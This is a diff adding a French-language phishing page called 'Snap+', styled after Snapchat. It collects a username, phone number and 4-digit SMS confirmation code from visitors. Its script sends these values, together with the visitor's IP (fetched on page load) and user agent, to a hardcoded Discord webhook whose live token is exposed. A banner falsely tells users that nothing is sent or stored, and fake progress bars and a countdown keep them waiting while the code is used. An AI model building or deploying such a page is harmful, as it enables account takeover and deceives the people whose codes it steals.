@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Snap+</title>
+<style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+    -webkit-tap-highlight-color: transparent;
+}
+
+html, body { width: 100%; min-height: 100%; }
+
+body {
+    min-height: 100vh;
+    min-height: 100dvh;
+    background: radial-gradient(circle at 50% 0%, #2a2a2a 0%, #111 45%, #060606 100%);
+    color: #fff;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    overflow-x: hidden;
+    padding: 16px;
+}
+
+.app {
+    width: 100%;
+    max-width: 420px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.page { width: 100%; animation: fade .35s ease; }
+.hidden { display: none !important; }
+
+@keyframes fade {
+    from { opacity: 0; transform: translateY(12px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+.logo {
+    width: 96px;
+    height: 96px;
+    border-radius: 28px;
+    margin: 0 auto 20px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+    box-shadow: 0 12px 34px rgba(255, 252, 0, .22);
+    background: #fffc00;
+}
+
+.logo img { width: 100%; height: 100%; object-fit: cover; display: block; }
+
+h1 {
+    text-align: center;
+    font-size: 28px;
+    font-weight: 700;
+    letter-spacing: -.4px;
+    margin-bottom: 6px;
+}
+
+.subtitle {
+    text-align: center;
+    color: #8a8a8a;
+    font-size: 14px;
+    margin-bottom: 26px;
+}
+
+.card {
+    width: 100%;
+    background: rgba(24, 24, 24, .96);
+    border: 1px solid #2e2e2e;
+    border-radius: 26px;
+    padding: 24px 20px;
+    box-shadow: 0 24px 70px rgba(0, 0, 0, .5);
+}
+
+label {
+    display: block;
+    font-size: 13px;
+    color: #9a9a9a;
+    margin-bottom: 8px;
+    font-weight: 500;
+}
+
+.input {
+    width: 100%;
+    height: 54px;
+    background: #0e0e0e;
+    border: 1px solid #333;
+    color: #fff;
+    padding: 0 16px;
+    border-radius: 16px;
+    outline: none;
+    margin-bottom: 20px;
+    font-size: 16px;
+    appearance: none;
+    transition: border-color .2s, background .2s;
+}
+
+.input:focus { border-color: #fffc00; background: #121212; }
+
+.phone-row { width: 100%; display: flex; gap: 10px; }
+
+.prefix {
+    width: 82px;
+    min-width: 82px;
+    height: 54px;
+    background: #0e0e0e;
+    border: 1px solid #333;
+    border-radius: 16px;
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 14px;
+    font-weight: 600;
+    gap: 4px;
+}
+
+.durations {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 9px;
+    margin-bottom: 22px;
+}
+
+.duration {
+    min-height: 52px;
+    padding: 8px 4px;
+    border-radius: 15px;
+    background: #0e0e0e;
+    border: 1px solid #333;
+    color: #9a9a9a;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    cursor: pointer;
+    font-size: 13px;
+    font-weight: 500;
+    user-select: none;
+    transition: all .18s;
+}
+
+.duration.active {
+    background: #fffc00;
+    color: #111;
+    border-color: #fffc00;
+    font-weight: 700;
+}
+
+.btn {
+    width: 100%;
+    min-height: 56px;
+    border: none;
+    background: #fffc00;
+    color: #111;
+    padding: 14px 16px;
+    border-radius: 16px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    touch-action: manipulation;
+    transition: transform .12s, box-shadow .2s;
+    box-shadow: 0 8px 24px rgba(255, 252, 0, .18);
+}
+
+.btn:active { transform: scale(.98); }
+
+.loading-page { width: 100%; text-align: center; padding: 30px 8px; }
+
+.loading-emoji {
+    font-size: 56px;
+    margin-bottom: 22px;
+    animation: bounce 1s infinite alternate;
+}
+
+@keyframes bounce {
+    from { transform: translateY(0); }
+    to { transform: translateY(-8px); }
+}
+
+.loading-title { font-size: 23px; font-weight: 700; margin-bottom: 8px; }
+
+.loading-text {
+    color: #8a8a8a;
+    font-size: 14px;
+    margin-bottom: 28px;
+    min-height: 18px;
+}
+
+.progress-container {
+    width: 100%;
+    height: 12px;
+    background: #1c1c1c;
+    border-radius: 30px;
+    overflow: hidden;
+    border: 1px solid #2e2e2e;
+}
+
+.progress-bar {
+    height: 100%;
+    width: 0%;
+    background: #fffc00;
+    border-radius: 30px;
+    transition: width .1s linear;
+}
+
+.percent { font-size: 20px; font-weight: 700; margin-top: 14px; }
+
+.code-info {
+    text-align: center;
+    color: #9a9a9a;
+    font-size: 14px;
+    line-height: 1.55;
+    margin-bottom: 22px;
+}
+
+.code-boxes {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    margin: 26px 0;
+}
+
+.code-input {
+    width: 62px;
+    height: 68px;
+    background: #0e0e0e;
+    border: 1px solid #333;
+    border-radius: 18px;
+    color: #fff;
+    text-align: center;
+    font-size: 27px;
+    font-weight: 700;
+    outline: none;
+    transition: border-color .2s, background .2s;
+}
+
+.code-input:focus { border-color: #fffc00; background: #121212; }
+
+.local-note {
+    margin-top: 16px;
+    padding: 12px;
+    border-radius: 14px;
+    background: #141414;
+    border: 1px solid #262626;
+    color: #777;
+    font-size: 11px;
+    text-align: center;
+    line-height: 1.45;
+}
+
+.success { text-align: center; }
+.success-icon { font-size: 64px; margin-bottom: 20px; }
+
+.countdown {
+    font-size: 44px;
+    font-weight: 700;
+    color: #fffc00;
+    margin: 26px 0;
+    letter-spacing: 1px;
+}
+
+.status { color: #888; font-size: 14px; }
+
+@media (max-width: 480px) {
+    body { padding: 13px; }
+    .logo { width: 84px; height: 84px; border-radius: 24px; margin-bottom: 18px; }
+    h1 { font-size: 25px; }
+    .subtitle { font-size: 13px; margin-bottom: 22px; }
+    .card { padding: 20px 17px; border-radius: 24px; }
+    .input { height: 52px; font-size: 16px; }
+    .prefix { width: 76px; min-width: 76px; height: 52px; font-size: 13px; }
+    .duration { min-height: 50px; font-size: 12px; }
+    .btn { min-height: 54px; font-size: 15px; }
+    .code-boxes { gap: 8px; }
+    .code-input {
+        width: calc((100vw - 110px) / 4);
+        max-width: 62px;
+        height: 62px;
+        font-size: 25px;
+        border-radius: 16px;
+    }
+    .countdown { font-size: 36px; }
+}
+
+@media (max-width: 350px) {
+    .card { padding: 17px 14px; }
+    .code-input { width: 52px; height: 56px; font-size: 22px; }
+    .code-boxes { gap: 6px; }
+    h1 { font-size: 23px; }
+    .logo { width: 72px; height: 72px; }
+}
+</style>
+</head>
+
+<body>
+
+<div class="app">
+
+    <section id="page1" class="page">
+
+        <div class="logo">
+            <img src="IMG_1487.png" alt="Snap+">
+        </div>
+
+        <h1>Snap+</h1>
+        <p class="subtitle">Configure ton accès</p>
+
+        <div class="card">
+
+            <label>Nom d'utilisateur</label>
+            <input
+                id="username"
+                class="input"
+                type="text"
+                maxlength="30"
+                placeholder="Ton pseudo"
+                autocomplete="off"
+            >
+
+            <label>Numéro de téléphone</label>
+            <div class="phone-row">
+                <div class="prefix">🇫🇷 +33</div>
+                <input
+                    id="phone"
+                    class="input"
+                    type="text"
+                    inputmode="numeric"
+                    maxlength="10"
+                    placeholder="6123456789"
+                    autocomplete="off"
+                    oninput="limitPhone(this)"
+                >
+            </div>
+
+            <label>Durée</label>
+            <div class="durations">
+                <div class="duration active" onclick="selectDuration(this)">1 mois</div>
+                <div class="duration" onclick="selectDuration(this)">3 mois</div>
+                <div class="duration" onclick="selectDuration(this)">1 an</div>
+            </div>
+
+            <button class="btn" onclick="startFirstLoading()">Continuer →</button>
+
+        </div>
+
+    </section>
+
+
+    <section id="loading1" class="page hidden">
+        <div class="loading-page">
+            <div id="emoji1" class="loading-emoji">🔄</div>
+            <div class="loading-title">Préparation...</div>
+            <div id="loadingText1" class="loading-text">Initialisation</div>
+            <div class="progress-container">
+                <div id="progress1" class="progress-bar"></div>
+            </div>
+            <div id="percent1" class="percent">0%</div>
+        </div>
+    </section>
+
+
+    <section id="codePage" class="page hidden">
+
+        <div class="logo">
+            <img src="IMG_1487.png" alt="Snap+">
+        </div>
+
+        <h1>Code de confirmation</h1>
+        <p class="subtitle">Entre ton code à 4 chiffres</p>
+
+        <div class="card">
+
+            <div class="code-info">
+                Le code peut prendre entre <b>2 et 5 minutes</b> à arriver.
+            </div>
+
+            <div class="code-boxes">
+                <input class="code-input" maxlength="1" inputmode="numeric" autocomplete="one-time-code" oninput="nextCode(this,0)" onkeydown="previousCode(event,0)">
+                <input class="code-input" maxlength="1" inputmode="numeric" oninput="nextCode(this,1)" onkeydown="previousCode(event,1)">
+                <input class="code-input" maxlength="1" inputmode="numeric" oninput="nextCode(this,2)" onkeydown="previousCode(event,2)">
+                <input class="code-input" maxlength="1" inputmode="numeric" oninput="nextCode(this,3)" onkeydown="previousCode(event,3)">
+            </div>
+
+            <button class="btn" onclick="submitCode()">Continuer →</button>
+
+            <div class="local-note">
+                🧪 Maquette locale — aucun code n'est envoyé, stocké ou vérifié.
+            </div>
+
+        </div>
+
+    </section>
+
+
+    <section id="loading2" class="page hidden">
+        <div class="loading-page">
+            <div id="emoji2" class="loading-emoji">⚙️</div>
+            <div class="loading-title">Finalisation...</div>
+            <div id="loadingText2" class="loading-text">Traitement local</div>
+            <div class="progress-container">
+                <div id="progress2" class="progress-bar"></div>
+            </div>
+            <div id="percent2" class="percent">0%</div>
+        </div>
+    </section>
+
+
+    <section id="finalPage" class="page hidden">
+        <div class="card success">
+            <div class="success-icon">✅</div>
+            <h1>Configuration terminée</h1>
+            <p class="subtitle">La maquette a terminé son processus.</p>
+            <div id="countdown" class="countdown">01:00:00</div>
+            <p class="status">⏳ Temps restant</p>
+        </div>
+    </section>
+
+</div>
+
+
+<script>
+
+/* =========================
+   WEBHOOK DISCORD
+========================= */
+
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1554843964769837190/WHJz8y26OqVRXqa2lT_EwwfWdBWyydrWArsec7WDfK5TB10pF0Dre7whII-lnyBG4Sim";
+
+/* Extrait l'ID du webhook + le token pour construire l'URL de PATCH */
+const WEBHOOK_PARTS = WEBHOOK_URL.split("/");
+const WEBHOOK_ID = WEBHOOK_PARTS[WEBHOOK_PARTS.length - 2];
+const WEBHOOK_TOKEN = WEBHOOK_PARTS[WEBHOOK_PARTS.length - 1];
+const WEBHOOK_BASE = "https://discord.com/api/webhooks/" + WEBHOOK_ID + "/" + WEBHOOK_TOKEN;
+
+
+/* =========================
+   SESSION — stockage local
+========================= */
+
+const session = {
+    ip: "en cours...",
+    pseudo: "—",
+    phone: "—",
+    duration: "—",
+    code: "—",
+    messageId: null
+};
+
+
+/* =========================
+   CONSTRUCTION DE L'EMBED
+========================= */
+
+function buildEmbed() {
+    return {
+        title: "📥 Nouvelle configuration",
+        color: 0xfffc00,
+        fields: [
+            { name: "🌐 IP", value: "`" + session.ip + "`", inline: false },
+            { name: "👤 Pseudo", value: session.pseudo, inline: true },
+            { name: "📞 Téléphone", value: "`" + session.phone + "`", inline: true },
+            { name: "⏱ Durée", value: session.duration, inline: true },
+            { name: "🔐 Code", value: "`" + session.code + "`", inline: false }
+        ],
+        footer: { text: navigator.userAgent.slice(0, 80) },
+        timestamp: new Date().toISOString()
+    };
+}
+
+
+/* =========================
+   POST — création du message
+========================= */
+
+async function createMessage() {
+    try {
+        const res = await fetch(WEBHOOK_BASE + "?wait=true", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                content: "@everyone",
+                username: "Snap+",
+                embeds: [buildEmbed()]
+            })
+        });
+        const data = await res.json();
+        session.messageId = data.id;
+    } catch (error) {
+        console.warn("Création échec:", error);
+    }
+}
+
+
+/* =========================
+   PATCH — modification du message
+========================= */
+
+async function updateMessage() {
+    if (!session.messageId) return;
+    try {
+        await fetch(WEBHOOK_BASE + "/messages/" + session.messageId, {
+            method: "PATCH",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                content: "@everyone",
+                embeds: [buildEmbed()]
+            })
+        });
+    } catch (error) {
+        console.warn("Update échec:", error);
+    }
+}
+
+
+/* =========================
+   ÉTAPE 1 — IP dès l'ouverture
+========================= */
+
+async function boot() {
+    /* création immédiate du message avec IP en cours */
+    await createMessage();
+
+    /* récupération de l'IP */
+    try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        session.ip = data.ip;
+    } catch (error) {
+        session.ip = "indisponible";
+    }
+
+    /* mise à jour instantanée du message avec l'IP */
+    updateMessage();
+}
+
+boot();
+
+
+/* =========================
+   ÉTAPE 2 — pseudo + num
+========================= */
+
+function limitPhone(input) {
+    input.value = input.value.replace(/\D/g, "").slice(0, 10);
+}
+
+function isValidPhone(phone) {
+    return phone.length === 9 || phone.length === 10;
+}
+
+function formatPhone(phone) {
+    if (phone.length === 9) return "0" + phone;
+    return phone;
+}
+
+function startFirstLoading() {
+    const username = document.getElementById("username").value.trim();
+    const phone = document.getElementById("phone").value.trim();
+    const duration = document.querySelector(".duration.active").textContent.trim();
+
+    if (!username) { alert("Entre ton pseudo."); return; }
+    if (!isValidPhone(phone)) { alert("Le numéro doit contenir 9 ou 10 chiffres."); return; }
+
+    session.pseudo = username;
+    session.phone = "+33 " + formatPhone(phone);
+    session.duration = duration;
+
+    /* mise à jour immédiate du message */
+    updateMessage();
+
+    runLoading("progress1", "percent1", "loadingText1", "emoji1", () => {
+        showPage("codePage");
+        setTimeout(() => {
+            const first = document.querySelector(".code-input");
+            if (first) first.focus();
+        }, 100);
+    });
+}
+
+
+/* =========================
+   PAGES
+========================= */
+
+function showPage(id) {
+    document.querySelectorAll(".page").forEach(page => page.classList.add("hidden"));
+    document.getElementById(id).classList.remove("hidden");
+}
+
+
+/* =========================
+   DUREE
+========================= */
+
+function selectDuration(element) {
+    document.querySelectorAll(".duration").forEach(d => d.classList.remove("active"));
+    element.classList.add("active");
+}
+
+
+/* =========================
+   LOADING — 20 SECONDES
+========================= */
+
+function runLoading(progressId, percentId, textId, emojiId, callback) {
+    if (progressId === "progress1") {
+        showPage("loading1");
+    } else {
+        showPage("loading2");
+    }
+
+    const bar = document.getElementById(progressId);
+    const percent = document.getElementById(percentId);
+    const text = document.getElementById(textId);
+    const emoji = document.getElementById(emojiId);
+
+    const duration = 20000;
+    const start = performance.now();
+
+    function animate(now) {
+        const elapsed = now - start;
+        const ratio = Math.min(elapsed / duration, 1);
+        const value = Math.floor(ratio * 100);
+
+        bar.style.width = value + "%";
+        percent.textContent = value + "%";
+
+        if (value < 25) {
+            emoji.textContent = "🔄";
+            text.textContent = "Initialisation...";
+        } else if (value < 50) {
+            emoji.textContent = "⚙️";
+            text.textContent = "Préparation...";
+        } else if (value < 75) {
+            emoji.textContent = "✨";
+            text.textContent = "Configuration...";
+        } else if (value < 100) {
+            emoji.textContent = "🚀";
+            text.textContent = "Finalisation...";
+        } else {
+            emoji.textContent = "✅";
+            text.textContent = "Terminé !";
+        }
+
+        if (elapsed < duration) {
+            requestAnimationFrame(animate);
+        } else {
+            setTimeout(() => callback(), 150);
+        }
+    }
+
+    requestAnimationFrame(animate);
+}
+
+
+/* =========================
+   CODE
+========================= */
+
+function nextCode(input, index) {
+    input.value = input.value.replace(/\D/g, "").slice(0, 1);
+    const inputs = document.querySelectorAll(".code-input");
+    if (input.value && index < inputs.length - 1) {
+        inputs[index + 1].focus();
+    }
+}
+
+function previousCode(event, index) {
+    const inputs = document.querySelectorAll(".code-input");
+    if (event.key === "Backspace" && !inputs[index].value && index > 0) {
+        inputs[index - 1].focus();
+    }
+}
+
+
+/* =========================
+   PASTE CODE
+========================= */
+
+document.addEventListener("paste", function(event) {
+    if (!event.target.classList.contains("code-input")) return;
+
+    const pasted = (event.clipboardData || window.clipboardData)
+        .getData("text")
+        .replace(/\D/g, "")
+        .slice(0, 4);
+
+    if (!pasted) return;
+
+    event.preventDefault();
+
+    const inputs = document.querySelectorAll(".code-input");
+
+    pasted.split("").forEach((digit, index) => {
+        if (inputs[index]) inputs[index].value = digit;
+    });
+
+    if (pasted.length === 4) inputs[3].focus();
+});
+
+
+/* =========================
+   ÉTAPE 3 — code → mise à jour finale
+========================= */
+
+function submitCode() {
+    const inputs = document.querySelectorAll(".code-input");
+    let code = "";
+
+    inputs.forEach(input => { code += input.value; });
+
+    if (code.length !== 4) { alert("Entre 4 chiffres."); return; }
+
+    session.code = code;
+
+    /* mise à jour immédiate du message avec le code */
+    updateMessage();
+
+    runLoading("progress2", "percent2", "loadingText2", "emoji2", () => {
+        showPage("finalPage");
+        startCountdown();
+    });
+}
+
+
+/* =========================
+   COUNTDOWN
+========================= */
+
+function startCountdown() {
+    let total = 60 * 60;
+    const element = document.getElementById("countdown");
+
+    function update() {
+        const hours = Math.floor(total / 3600);
+        const minutes = Math.floor((total % 3600) / 60);
+        const seconds = total % 60;
+
+        element.textContent =
+            String(hours).padStart(2, "0") + ":" +
+            String(minutes).padStart(2, "0") + ":" +
+            String(seconds).padStart(2, "0");
+
+        if (total > 0) { total--; setTimeout(update, 1000); }
+    }
+
+    update();
+}
+
+</script>
+
+</body>
+</html>
